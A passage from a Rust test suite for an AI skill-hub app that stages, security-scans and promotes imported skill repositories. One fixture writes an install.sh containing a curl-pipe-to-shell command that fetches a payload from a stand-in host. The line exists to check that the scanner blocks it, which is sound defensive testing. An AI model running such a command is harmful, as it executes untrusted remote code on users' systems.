            security_scanned_files: 0,
            security_findings: Vec::new(),
        };
        stage_github_source_import_with_git_program(
            &prompt_plan,
            &prompt_stage,
            &mut prompt_execution,
            "ai-skillhub-test-missing-git.exe",
        )
        .expect("prompt repository should download without Git");
        assert_eq!(
            prompt_execution.status, "warn",
            "{:?}",
            prompt_execution.blocking_checks
        );
        assert_eq!(prompt_execution.download_method, "github-codeload");
        let (prompt_skills, prompt_docs) =
            count_skill_dirs_in_path(&prompt_stage).expect("prompt stage should scan");
        assert_eq!(prompt_skills, 0);
        assert!(prompt_docs >= 1);
        assert!(prompt_stage.join("README.md").exists());
        assert!(!prompt_stage.join(".git").exists());

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    #[ignore = "network-dependent Imbad0202 recipient gate"]
    fn github_codeload_imports_real_academic_research_skills_codex_without_security_noise() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-academic-research-recipient-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test database should open");
        let plan = build_source_import_plan(
            &root,
            &connection,
            "github",
            "https://github.com/Imbad0202/academic-research-skills-codex.git",
        )
        .expect("academic research plan should build");
        let staged_path = source_import_staging_root(&root).join("academic-research-codeload");
        let mut execution = SourceImportExecutionCard {
            id: "academic-research-no-git".to_string(),
            import_kind: "github".to_string(),
            input: plan.input.clone(),
            status: "blocked".to_string(),
            risk_level: "low".to_string(),
            summary: String::new(),
            staged_path: staged_path.display().to_string(),
            report_path: String::new(),
            manifest_path: String::new(),
            copied_files: 0,
            copied_bytes: 0,
            skill_count: 0,
            prompt_count: 0,
            blocking_checks: Vec::new(),
            rollback_steps: Vec::new(),
            real_write_scope: "staging-only".to_string(),
            download_method: String::new(),
            security_status: "not-run".to_string(),
            security_scanned_files: 0,
            security_findings: Vec::new(),
        };

        stage_github_source_import_with_git_program(
            &plan,
            &staged_path,
            &mut execution,
            "ai-skillhub-test-missing-git.exe",
        )
        .expect("codeload fallback should import the real repository");
        apply_security_scan_to_execution(&staged_path, &mut execution)
            .expect("the staged repository should complete a per-file scan");

        eprintln!(
            "recipient security gate: status={}, files={}, findings={}, skills={}",
            execution.security_status,
            execution.security_scanned_files,
            execution.security_findings.len(),
            execution.skill_count
        );

        assert_eq!(execution.download_method, "github-codeload");
        assert!(
            execution.skill_count >= 2,
            "expected the real Codex wrapper and source Skill directories"
        );
        assert!(execution.copied_files > 0);
        assert!(execution.security_scanned_files > 0);
        assert_ne!(
            execution.status, "blocked",
            "documentation, tests and the script inventory must not block the whole repository"
        );
        assert_eq!(execution.security_status, "review");
        assert!(
            execution
                .security_findings
                .iter()
                .all(|finding| finding.severity != "high"),
            "real executable Skill instructions remain blocking, but this repository's examples must stay review-only"
        );
        assert!(
            execution.security_findings.len() < 100,
            "script inventory must not create one finding per executable file"
        );
        assert!(!staged_path.join(".git").exists());
        assert!(!Path::new(&source_import_target_path(
            &root,
            "academic-research-skills-codex"
        ))
        .exists());

        for entry in fs::read_dir(&staged_path).expect("staged root should remain readable") {
            let entry = entry.expect("staged entry should be readable");
            let metadata = fs::symlink_metadata(entry.path()).expect("metadata should be readable");
            assert!(
                !metadata.file_type().is_symlink(),
                "no symlink may be materialized"
            );
        }

        let _ = fs::remove_dir_all(root);
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn cancelling_a_running_git_import_stops_the_child_and_preserves_formal_sources() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-running-cancel-test-{}",
            unix_timestamp_string()
        ));
        fs::create_dir_all(&root).expect("test root should create");
        let connection = open_index_database(&root).expect("test database should open");
        let plan = build_source_import_plan(
            &root,
            &connection,
            "github",
            "https://github.com/Imbad0202/academic-research-skills.git",
        )
        .expect("cancel plan should build");
        let staged_path = source_import_staging_root(&root).join("cancelled-running-clone");
        let formal_path = managed_sources_dir(&root).join("existing-source");
        fs::create_dir_all(&formal_path).expect("formal source should create");
        fs::write(formal_path.join("SKILL.md"), b"# Existing\n")
            .expect("formal source sentinel should write");

        let slow_git = root.join("slow-git.cmd");
        fs::write(
            &slow_git,
            b"@echo off\r\nping 127.0.0.1 -n 30 >nul\r\nexit /b 0\r\n",
        )
        .expect("slow Git fixture should write");
        let cancelled = Arc::new(AtomicBool::new(false));
        let control = SourceImportControl::detached_with_cancellation(
            "running-cancel-test",
            Arc::clone(&cancelled),
        );
        let cancel_signal = Arc::clone(&cancelled);
        let canceller = thread::spawn(move || {
            thread::sleep(Duration::from_millis(350));
            cancel_signal.store(true, Ordering::SeqCst);
        });
        let mut execution = SourceImportExecutionCard {
            id: "cancel-running-git".to_string(),
            import_kind: "github".to_string(),
            input: plan.input.clone(),
            status: "blocked".to_string(),
            risk_level: "low".to_string(),
            summary: String::new(),
            staged_path: staged_path.display().to_string(),
            report_path: String::new(),
            manifest_path: String::new(),
            copied_files: 0,
            copied_bytes: 0,
            skill_count: 0,
            prompt_count: 0,
            blocking_checks: Vec::new(),
            rollback_steps: Vec::new(),
            real_write_scope: "staging-only".to_string(),
            download_method: String::new(),
            security_status: "not-run".to_string(),
            security_scanned_files: 0,
            security_findings: Vec::new(),
        };

        let started = Instant::now();
        let result = stage_github_source_import_with_git_program_and_control(
            &plan,
            &staged_path,
            &mut execution,
            &slow_git.to_string_lossy(),
            &control,
        );
        canceller.join().expect("cancellation thread should finish");

        assert_eq!(
            result.expect_err("the running import must cancel"),
            SOURCE_IMPORT_CANCELLED_MESSAGE
        );
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "cancellation must terminate the owned process tree promptly"
        );
        assert!(!staged_path.exists(), "partial staging must be removed");
        assert!(
            formal_path.join("SKILL.md").exists(),
            "formal sources must remain untouched"
        );
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_import_staging_copies_local_candidate_without_formal_install() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-import-stage-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let local_source = root.join("sample-local-source");
        let skill_dir = local_source.join("skills").join("paper-helper");
        fs::create_dir_all(&skill_dir).expect("skill dir should create");
        fs::write(skill_dir.join("SKILL.md"), "# Paper Helper\n").expect("skill file should write");
        fs::write(local_source.join("README.md"), "# Prompt notes\n").expect("readme should write");

        let execution = stage_source_import_candidate_in_connection(
            &root,
            &connection,
            "local",
            &local_source.to_string_lossy(),
        )
        .expect("local staging should execute");

        assert_eq!(execution.status, "staged");
        assert_eq!(execution.real_write_scope, "staging-only");
        assert!(Path::new(&execution.staged_path).exists());
        assert!(Path::new(&execution.report_path).exists());
        assert!(Path::new(&execution.manifest_path).exists());
        assert_eq!(execution.skill_count, 1);
        assert!(execution.copied_files >= 2);
        assert!(!Path::new(&source_import_target_path(&root, "sample-local-source")).exists());

        let audit_events = read_indexed_audit_events(&connection).expect("audit should read");
        assert!(audit_events
            .iter()
            .any(|event| event.event_type == "source_import_staged"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_import_staging_extracts_safe_zip_without_formal_install() {
        use std::io::Write;

        let root = std::env::temp_dir().join(format!(
            "skillhub-import-zip-stage-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let package_path = root.join("packed-skills.zip");
        fs::create_dir_all(&root).expect("root should create");

        {
            let file = fs::File::create(&package_path).expect("zip should create");
            let mut archive = zip::ZipWriter::new(file);
            let options = zip::write::FileOptions::default()
                .compression_method(zip::CompressionMethod::Deflated);
            archive
                .add_directory("skills/paper-helper/", options)
                .expect("directory should add");
            archive
                .start_file("skills/paper-helper/SKILL.md", options)
                .expect("skill should add");
            archive
                .write_all(b"# Paper Helper\n")
                .expect("skill should write");
            archive
                .start_file("README.md", options)
                .expect("readme should add");
            archive
                .write_all(b"# Prompt notes\n")
                .expect("readme should write");
            archive.finish().expect("zip should finish");
        }

        let plan =
            build_source_import_plan(&root, &connection, "zip", &package_path.to_string_lossy())
                .expect("zip import plan should build");
        assert_eq!(plan.status, "ready");
        assert!(plan.safe_to_continue);
        assert_eq!(plan.skill_count, 1);

        let execution = stage_source_import_candidate_in_connection(
            &root,
            &connection,
            "zip",
            &package_path.to_string_lossy(),
        )
        .expect("zip staging should execute");

        assert_eq!(execution.status, "staged");
        assert_eq!(execution.real_write_scope, "staging-only");
        assert!(Path::new(&execution.staged_path).exists());
        assert!(Path::new(&execution.report_path).exists());
        assert!(Path::new(&execution.manifest_path).exists());
        assert_eq!(execution.skill_count, 1);
        assert!(execution.copied_files >= 2);
        assert!(Path::new(&execution.staged_path)
            .join("skills")
            .join("paper-helper")
            .join("SKILL.md")
            .exists());
        assert!(!Path::new(&source_import_target_path(&root, "packed-skills")).exists());

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_import_promotion_copies_staging_to_managed_sources_only() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-import-promote-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let local_source = root.join("sample-local-source");
        let skill_dir = local_source.join("skills").join("paper-helper");
        fs::create_dir_all(&skill_dir).expect("skill dir should create");
        fs::write(skill_dir.join("SKILL.md"), "# Paper Helper\n").expect("skill file should write");
        fs::write(local_source.join("README.md"), "# Prompt notes\n").expect("readme should write");

        let execution = stage_source_import_candidate_in_connection(
            &root,
            &connection,
            "local",
            &local_source.to_string_lossy(),
        )
        .expect("local staging should execute");

        let promotion = promote_staged_source_import_in_connection(
            &root,
            &connection,
            "local",
            &execution.staged_path,
            "promoted-paper-pack",
            false,
        )
        .expect("promotion should complete");

        let target = Path::new(&promotion.target_path);
        assert_eq!(promotion.status, "promoted");
        assert_eq!(
            promotion.real_write_scope,
            "app-next/data/github_sources-only"
        );
        assert!(target
            .join("skills")
            .join("paper-helper")
            .join("SKILL.md")
            .exists());
        assert!(Path::new(&promotion.report_path).exists());
        assert!(Path::new(&promotion.manifest_path).exists());
        assert_eq!(promotion.skill_count, 1);
        assert!(promotion.copied_files >= 2);
        assert!(!root.join("skills").join("paper-helper").exists());

        let audit_events = read_indexed_audit_events(&connection).expect("audit should read");
        assert!(audit_events
            .iter()
            .any(|event| event.event_type == "source_import_promoted"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_import_promotion_rejects_non_staging_paths_and_reuses_existing_targets() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-import-promote-guard-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let outside_source = root.join("outside-source");
        let outside_skill = outside_source.join("skills").join("paper-helper");
        fs::create_dir_all(&outside_skill).expect("outside skill dir should create");
        fs::write(outside_skill.join("SKILL.md"), "# Paper Helper\n")
            .expect("outside skill should write");

        let rejected = promote_staged_source_import_in_connection(
            &root,
            &connection,
            "local",
            &outside_source.to_string_lossy(),
            "outside-source",
            false,
        )
        .expect("promotion report should write");
        assert_eq!(rejected.status, "blocked");
        assert!(rejected
            .blocking_checks
            .iter()
            .any(|check| check.contains("staging")));
        assert!(!Path::new(&rejected.target_path).exists());

        let staged_root = source_import_staging_root(&root).join("duplicate-source");
        let staged_skill = staged_root.join("skills").join("paper-helper");
        fs::create_dir_all(&staged_skill).expect("staged skill dir should create");
        fs::write(staged_skill.join("SKILL.md"), "# Paper Helper\n")
            .expect("staged skill should write");
        let existing_target = PathBuf::from(source_import_target_path(&root, "duplicate-source"));
        fs::create_dir_all(&existing_target).expect("existing target should create");

        let duplicate = promote_staged_source_import_in_connection(
            &root,
            &connection,
            "local",
            &staged_root.to_string_lossy(),
            "duplicate-source",
            false,
        )
        .expect("duplicate promotion report should write");
        assert_eq!(duplicate.status, "already-managed");
        assert!(duplicate
            .blocking_checks
            .iter()
            .any(|check| check.contains("已添加过")));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_import_promotion_requires_explicit_security_review_confirmation() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-import-review-gate-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let staged_root = source_import_staging_root(&root).join("review-source");
        let staged_skill = staged_root.join("skills").join("review-helper");
        fs::create_dir_all(&staged_skill).expect("review skill dir should create");
        fs::write(staged_skill.join("SKILL.md"), "# Review Helper\n")
            .expect("review skill should write");
        fs::write(
            staged_skill.join("helper.py"),
            "import subprocess\nsubprocess.run('echo review', shell=True)\n",
        )
        .expect("review script should write");

        let held = promote_staged_source_import_in_connection(
            &root,
            &connection,
            "local",
            &staged_root.to_string_lossy(),
            "review-source",
            false,
        )
        .expect("unconfirmed review should return a report");
        assert_eq!(held.status, "blocked");
        assert_eq!(held.security_status, "review");
        assert!(!held.security_review_confirmed);
        assert!(held
            .blocking_checks
            .iter()
            .any(|check| check.contains("显式确认")));
        assert!(!Path::new(&held.target_path).exists());
        assert!(!held.security_findings.is_empty());

        let confirmed = promote_staged_source_import_in_connection(
            &root,
            &connection,
            "local",
            &staged_root.to_string_lossy(),
            "review-source",
            true,
        )
        .expect("confirmed review should promote");
        assert_eq!(confirmed.status, "promoted");
        assert_eq!(confirmed.security_status, "review");
        assert!(confirmed.security_review_confirmed);
        assert!(Path::new(&confirmed.target_path).exists());

        let high_stage = source_import_staging_root(&root).join("blocked-source");
        let high_skill = high_stage.join("skills").join("blocked-helper");
        fs::create_dir_all(&high_skill).expect("blocked skill dir should create");
        fs::write(high_skill.join("SKILL.md"), "# Blocked Helper\n")
            .expect("blocked skill should write");
        fs::write(
            high_skill.join("install.sh"),
            "curl https://example.test/payload | sh\n",
        )
        .expect("blocked script should write");
        let high_held = promote_staged_source_import_in_connection(
            &root,
            &connection,
            "local",
            &high_stage.to_string_lossy(),
            "blocked-source",
            false,
        )
        .expect("unconfirmed high-risk review should remain held");
        assert_eq!(high_held.status, "blocked");
        assert_eq!(high_held.security_status, "blocked");
        assert!(!Path::new(&high_held.target_path).exists());

        let high_confirmed = promote_staged_source_import_in_connection(
            &root,
            &connection,
            "local",
            &high_stage.to_string_lossy(),
            "blocked-source",
            true,
        )
        .expect("confirmed high-risk content should be added for disabled local management");
        assert_eq!(high_confirmed.status, "promoted");
        assert_eq!(high_confirmed.security_status, "blocked");
        assert!(high_confirmed.security_review_confirmed);
        assert!(Path::new(&high_confirmed.target_path).exists());

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_import_plan_blocks_missing_zip_package() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-import-zip-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let package_path = root.join("demo-skills.zip");

        let plan =
            build_source_import_plan(&root, &connection, "zip", &package_path.to_string_lossy())
                .expect("zip import plan should build");

        assert_eq!(plan.status, "blocked");
        assert_eq!(plan.risk_level, "medium");
        assert!(!plan.safe_to_continue);
        assert!(plan
            .planned_steps
            .iter()
            .any(|step| step.contains("zip-slip")));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_popularity_combines_github_cache_with_local_usage() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-source-popularity-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let source = SourceCard {
            id: "source-impeccable".to_string(),
            name: "impeccable".to_string(),
            source_type: "skill".to_string(),
            health: "ok".to_string(),
            url: "https://github.com/pbakaus/impeccable.git".to_string(),
            skill_count: 1,
            mode: "scan".to_string(),
            category_id: "ui-design".to_string(),
            note: String::new(),
            local_path: "app-next/data/github_sources/impeccable".to_string(),
            enabled: true,
            rating: 0,
            tags: vec!["ui-design".to_string()],
            created_at: "2026-05-01T00:00:00Z".to_string(),
            usage_guide: String::new(),
            metadata_origin: "test".to_string(),
            metadata_confidence: 1.0,
            user_folder_id: String::new(),
            user_folder_name: String::new(),
            user_folder_color: String::new(),
        };
        let popularity = GithubPopularityFetch {
            created_at: "2026-05-01T00:00:00Z".to_string(),
            stars: 1234,
            forks: 56,
            open_issues: 7,
            last_updated_at: "2026-05-29T00:00:00Z".to_string(),
        };

        upsert_source_popularity_cache(
            &connection,
            &source,
            "pbakaus",
            "impeccable",
            &popularity,
            "123",
            "fresh",
            "",
        )
        .expect("popularity cache should save");
        record_usage_event_row_in_connection(
            &connection,
            "source",
            "source-impeccable",
            "impeccable",
            "impeccable",
            "open_source",
        )
        .expect("source usage should save");
        record_usage_event_row_in_connection(
            &connection,
            "skill",
            "impeccable",
            "impeccable",
            "impeccable",
            "skill_call",
        )
        .expect("skill usage should save");

        let stats = read_indexed_usage_stats(&connection).expect("usage stats should read");
        let popularity_cards = read_indexed_source_popularity(&connection, &[source], &stats)
            .expect("source popularity should read");
        let card = popularity_cards
            .first()
            .expect("popularity card should exist");

        assert_eq!(card.stars, 1234);
        assert_eq!(card.forks, 56);
        assert_eq!(card.created_at, "2026-05-01T00:00:00Z");
        assert_eq!(card.trend_points.len(), 1);
        assert_eq!(card.trend_points[0].stars, 1234);
        assert_eq!(card.local_total_count, 1);
        assert!(card.local_seven_day_count >= 1);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn github_rate_limit_popularity_errors_are_deferred_not_failed() {
        assert_eq!(
            source_popularity_cache_status_for_error(
                "GitHub API status 403 for owner/repo; remaining=0; API rate limit exceeded"
            ),
            "deferred"
        );
        assert_eq!(
            source_popularity_cache_status_for_error(
                "GitHub API request failed for owner/repo: network error"
            ),
            "deferred"
        );
        assert_eq!(
            source_popularity_cache_status_for_error("GitHub API status 404 for owner/repo"),
            "error"
        );
    }

    #[test]
    fn source_popularity_cache_freshness_uses_ttl_and_deferred_backoff() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-popularity-freshness-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let now = 1_800_000_u128 * NANOS_PER_SECOND;

        connection
            .execute(
                "INSERT INTO source_popularity_cache (
                    source_id, source_name, url, owner, repo, created_at, stars, forks,
                    open_issues, last_updated_at, fetched_at, cache_status, error
                ) VALUES (
                    'source-fresh', 'fresh', 'https://github.com/example/fresh.git',
                    'example', 'fresh', '', 1, 0, 0, '', ?1, 'fresh', ''
                )",
                params![(now - 120 * NANOS_PER_SECOND).to_string()],
            )
            .expect("fresh cache should insert");
        connection
            .execute(
                "INSERT INTO source_popularity_cache (
                    source_id, source_name, url, owner, repo, created_at, stars, forks,
                    open_issues, last_updated_at, fetched_at, cache_status, error
                ) VALUES (
                    'source-deferred', 'deferred', 'https://github.com/example/deferred.git',
                    'example', 'deferred', '', 0, 0, 0, '', ?1, 'deferred',
                    'GitHub API status 403; remaining=0'
                )",
                params![(now - 120 * NANOS_PER_SECOND).to_string()],
            )
            .expect("deferred cache should insert");
        connection
            .execute(
                "INSERT INTO source_popularity_cache (
                    source_id, source_name, url, owner, repo, created_at, stars, forks,
                    open_issues, last_updated_at, fetched_at, cache_status, error
                ) VALUES (
                    'source-old-deferred', 'old deferred', 'https://github.com/example/old.git',
                    'example', 'old', '', 0, 0, 0, '', ?1, 'deferred',
                    'GitHub API status 403; remaining=0'
                )",
                params![
                    (now - SOURCE_POPULARITY_DEFERRED_BACKOFF_NANOS - 10 * NANOS_PER_SECOND)
                        .to_string()
                ],
            )
            .expect("old deferred cache should insert");

        assert!(
            source_popularity_cache_is_recent(&connection, "source-fresh", now)
                .expect("fresh cache should read")
        );
        assert!(
            source_popularity_cache_is_recent(&connection, "source-deferred", now)
                .expect("deferred cache should read")
        );
        assert!(
            !source_popularity_cache_is_recent(&connection, "source-old-deferred", now)
                .expect("old deferred cache should read")
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn tag_overrides_and_preset_distribution_are_persisted() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-tags-distribution-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let timestamp = unix_timestamp_string();

        connection
            .execute(
                "INSERT INTO sources (
                    id, name, source_type, url, local_path, install_mode,
                    category_id, note, enabled, created_at, updated_at
                ) VALUES (
                    'source-paper', 'paper-pack', 'skill',
                    'https://github.com/example/paper-pack.git', '',
                    'scan', 'paper-research', '', 1, ?1, ?1
                )",
                params![&timestamp],
            )
            .expect("source row should insert");
        connection
            .execute(
                "INSERT INTO skills (
                    id, source_id, name, folder_name, description, category_id,
                    health_status, health_summary, enabled, relative_path,
                    created_at, updated_at
                ) VALUES (
                    'skill-paper-workflow', 'source-paper', 'paper-workflow',
                    'paper-workflow', 'Original description', 'paper-research',
                    'ok', '', 1, 'skills\\paper-workflow', ?1, ?1
                )",
                params![&timestamp],
            )
            .expect("skill row should insert");
        connection
            .execute(
                "INSERT INTO workspaces (
                    id, name, scope, path, enabled, created_at, updated_at
                ) VALUES (
                    'workspace-global', '全局工作区', 'global',
                    'C:\\AI-SkillHub-Test', 1, ?1, ?1
                )",
                params![&timestamp],
            )
            .expect("workspace row should insert");
        connection
            .execute(
                "INSERT INTO presets (
                    id, name, description, color, enabled, created_at, updated_at
                ) VALUES (
                    'preset-paper', '论文科研', 'Paper preset',
                    'mint', 1, ?1, ?1
                )",
                params![&timestamp],
            )
            .expect("preset row should insert");
        connection
            .execute(
                "INSERT INTO preset_skills (preset_id, skill_id)
                VALUES ('preset-paper', 'skill-paper-workflow')",
                [],
            )
            .expect("preset skill row should insert");

        set_skill_tags_in_connection(
            &connection,
            "paper-workflow",
            &["论文科研".to_string(), "常用".to_string()],
        )
        .expect("skill tags should save");
        set_source_tags_in_connection(
            &connection,
            "source-paper",
            &["GitHub".to_string(), "论文科研".to_string()],
        )
        .expect("source tags should save");
        set_preset_workspace_enabled_in_connection(
            &connection,
            "preset-paper",
            "workspace-global",
            true,
        )
        .expect("preset distribution should save");

        let skills = read_indexed_skills(&connection).expect("skills should read");
        let skill = skills
            .iter()
            .find(|item| item.folder_name == "paper-workflow")
            .expect("skill should exist");
        assert!(skill.tags.contains(&"论文科研".to_string()));
        assert!(skill.tags.contains(&"常用".to_string()));

        let sources = read_indexed_sources(&connection).expect("sources should read");
        let source = sources
            .iter()
            .find(|item| item.id == "source-paper")
            .expect("source should exist");
        assert!(source.tags.contains(&"GitHub".to_string()));
        assert!(source.tags.contains(&"论文科研".to_string()));

        let tags = read_indexed_tags(&connection).expect("tags should read");
        let paper_tag = tags
            .iter()
            .find(|tag| tag.name == "论文科研")
            .expect("paper tag should exist");
        assert!(paper_tag.target_count >= 2);

        let presets = read_indexed_presets(&connection).expect("presets should read");
        let preset = presets
            .iter()
            .find(|item| item.id == "preset-paper")
            .expect("preset should exist");
        assert_eq!(preset.skill_count, 1);
        assert_eq!(preset.workspace_count, 1);

        let distributions =
            read_indexed_preset_distributions(&connection).expect("distributions should read");
        let distribution = distributions
            .iter()
            .find(|item| {
                item.preset_id == "preset-paper" && item.workspace_id == "workspace-global"
            })
            .expect("distribution should exist");
        assert!(distribution.enabled);
        assert_eq!(distribution.skill_count, 1);
        assert!(
            distribution.summary.contains("不会写入工具目录")
                || distribution.summary.contains("已面向")
        );

        let audit_events = read_indexed_audit_events(&connection).expect("audit should read");
        assert!(audit_events
            .iter()
            .any(|event| event.event_type == "skill_tags_updated"));
        assert!(audit_events
            .iter()
            .any(|event| event.event_type == "source_tags_updated"));
        assert!(audit_events
            .iter()
            .any(|event| event.event_type == "preset_workspace_updated"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn release_gate_runners_write_reports_without_unlocking_real_package() {
        let root =
            std::env::temp_dir().join(format!("skillhub-runner-test-{}", unix_timestamp_string()));
        let connection = open_index_database(&root).expect("test sqlite should open");

        run_release_gate_runner_in_connection(&root, &connection, "diagnostics-export")
            .expect("diagnostics runner should execute");
        run_release_gate_runner_in_connection(&root, &connection, "share-validation")
            .expect("share runner should execute");
        run_release_gate_runner_in_connection(&root, &connection, "release-package")
            .expect("release package runner should stay plan-only");
        run_release_gate_runner_in_connection(&root, &connection, "write-execution-plan")
            .expect("write plan runner should execute");
        run_release_gate_runner_in_connection(&root, &connection, "agent-sync-readiness")
            .expect("agent sync readiness runner should execute");
        run_release_gate_runner_in_connection(&root, &connection, "release-package-readiness")
            .expect("release package readiness runner should execute");
        run_release_gate_runner_in_connection(&root, &connection, "agent-sync-executor")
            .expect("agent sync executor should write a guarded report");
        run_release_gate_runner_in_connection(&root, &connection, "release-package-executor")
            .expect("release package executor should write a guarded report");
        run_release_gate_runner_in_connection(&root, &connection, "v2-completion-audit")
            .expect("completion audit runner should execute");
        run_release_gate_runner_in_connection(&root, &connection, "report-bundle")
            .expect("report bundle runner should execute");

        let runners =
            read_indexed_operation_runners(&connection, &root).expect("runners should read");
        let diagnostics = runners
            .iter()
            .find(|runner| runner.id == "diagnostics-export")
            .expect("diagnostics runner should exist");
        let package = runners
            .iter()
            .find(|runner| runner.id == "release-package")
            .expect("release package runner should exist");
        let bundle = runners
            .iter()
            .find(|runner| runner.id == "report-bundle")
            .expect("report bundle runner should exist");
        let write_plan = runners
            .iter()
            .find(|runner| runner.id == "write-execution-plan")
            .expect("write execution plan runner should exist");
        let agent_sync_readiness = runners
            .iter()
            .find(|runner| runner.id == "agent-sync-readiness")
            .expect("agent sync readiness runner should exist");
        let release_package_readiness = runners
            .iter()
            .find(|runner| runner.id == "release-package-readiness")
            .expect("release package readiness runner should exist");
        let agent_sync_executor = runners
            .iter()
            .find(|runner| runner.id == "agent-sync-executor")
            .expect("agent sync executor should exist");
        let release_package_executor = runners
            .iter()
            .find(|runner| runner.id == "release-package-executor")
            .expect("release package executor should exist");
        let completion_audit = runners
            .iter()
            .find(|runner| runner.id == "v2-completion-audit")
            .expect("completion audit runner should exist");

        assert_eq!(diagnostics.status, "ok");
        assert!(Path::new(&diagnostics.report_path).exists());
        assert!(Path::new(&diagnostics.latest_json_path).exists());
        assert!(Path::new(&diagnostics.latest_markdown_path).exists());
        assert!(Path::new(&diagnostics.manifest_path).exists());
        assert!(diagnostics.file_count >= 6);
        assert_eq!(package.status, "locked");
        assert!(package.locked);
        assert!(Path::new(&package.report_path).exists());
        assert!(Path::new(&package.manifest_path).exists());
        assert_eq!(bundle.status, "ok");
        assert!(Path::new(&bundle.report_path).exists());
        assert!(Path::new(&bundle.latest_json_path).exists());
        assert!(Path::new(&bundle.manifest_path).exists());
        assert!(bundle.file_count >= 6);
        assert_eq!(write_plan.status, "locked");
        assert!(Path::new(&write_plan.latest_json_path).exists());
        assert!(Path::new(&write_plan.latest_markdown_path).exists());
        assert_eq!(agent_sync_readiness.status, "blocked");
        assert!(Path::new(&agent_sync_readiness.latest_json_path).exists());
        assert!(Path::new(&agent_sync_readiness.manifest_path).exists());
        assert_eq!(release_package_readiness.status, "blocked");
        assert!(Path::new(&release_package_readiness.latest_json_path).exists());
        assert!(Path::new(&release_package_readiness.manifest_path).exists());
        assert_eq!(agent_sync_executor.status, "blocked");
        assert!(Path::new(&agent_sync_executor.latest_json_path).exists());
        assert!(Path::new(&agent_sync_executor.manifest_path).exists());
        assert_eq!(release_package_executor.status, "blocked");
        assert!(Path::new(&release_package_executor.latest_json_path).exists());
        assert!(Path::new(&release_package_executor.manifest_path).exists());
        assert_eq!(completion_audit.status, "warn");
        assert!(Path::new(&completion_audit.latest_json_path).exists());

        let diagnostics_markdown = fs::read_to_string(&diagnostics.latest_markdown_path)
            .expect("latest markdown should be readable");
        assert!(diagnostics_markdown.contains("latest-diagnostics-export.json"));
        assert!(!diagnostics_markdown.contains(root.to_string_lossy().as_ref()));
        let diagnostics_json: Value = serde_json::from_str(
            &fs::read_to_string(&diagnostics.latest_json_path).expect("latest json should read"),
        )
        .expect("latest json should parse");
        assert_eq!(diagnostics_json["root"], "<AI_SKILLHUB_ROOT>");
        let bundle_json: Value = serde_json::from_str(
            &fs::read_to_string(&bundle.latest_json_path).expect("bundle json should read"),
        )
        .expect("bundle json should parse");
        assert_eq!(bundle_json["kind"], "v2-report-bundle-index");
        let write_plan_json: Value = serde_json::from_str(
            &fs::read_to_string(&write_plan.latest_json_path).expect("write plan json should read"),
        )
        .expect("write plan json should parse");
        assert_eq!(write_plan_json["kind"], "v2-write-execution-plan");
        assert_eq!(write_plan_json["realWrites"], false);
        let agent_readiness_json: Value = serde_json::from_str(
            &fs::read_to_string(&agent_sync_readiness.latest_json_path)
                .expect("agent readiness json should read"),
        )
        .expect("agent readiness json should parse");
        assert_eq!(agent_readiness_json["kind"], "v2-real-write-readiness");
        assert_eq!(agent_readiness_json["realWrites"], false);
        assert_eq!(
            agent_readiness_json["writeBoundary"][1],
            "No Claude/Codex/Antigravity directory is modified."
        );
        let agent_executor_json: Value = serde_json::from_str(
            &fs::read_to_string(&agent_sync_executor.latest_json_path)
                .expect("agent executor json should read"),
        )
        .expect("agent executor json should parse");
        assert_eq!(
            agent_executor_json["kind"],
            "v2-real-write-execution-attempt"
        );
        assert_eq!(agent_executor_json["realWrites"], false);
        assert_eq!(agent_executor_json["armed"], false);
        assert!(agent_executor_json["writeBoundary"][2]
            .as_str()
            .unwrap_or_default()
            .contains("Claude/Codex/Antigravity"));
        let completion_json: Value = serde_json::from_str(
            &fs::read_to_string(&completion_audit.latest_json_path)
                .expect("completion audit json should read"),
        )
        .expect("completion audit json should parse");
        assert_eq!(completion_json["kind"], "v2-completion-audit");
        assert!(!fs::read_to_string(&bundle.latest_markdown_path)
            .expect("bundle markdown should read")
            .contains(root.to_string_lossy().as_ref()));

        let allowed_report =
            validate_release_gate_export_path(&root, &diagnostics.latest_markdown_path)
                .expect("latest markdown path should be allowed");
        assert_eq!(
            allowed_report,
            Path::new(&diagnostics.latest_markdown_path)
                .canonicalize()
                .expect("latest markdown should canonicalize")
        );
        let outside_report = app_next_root(&root).join("outside-report.md");
        fs::write(&outside_report, "not a v2 export").expect("outside report should write");
        assert!(validate_release_gate_export_path(
            &root,
            outside_report.to_string_lossy().as_ref()
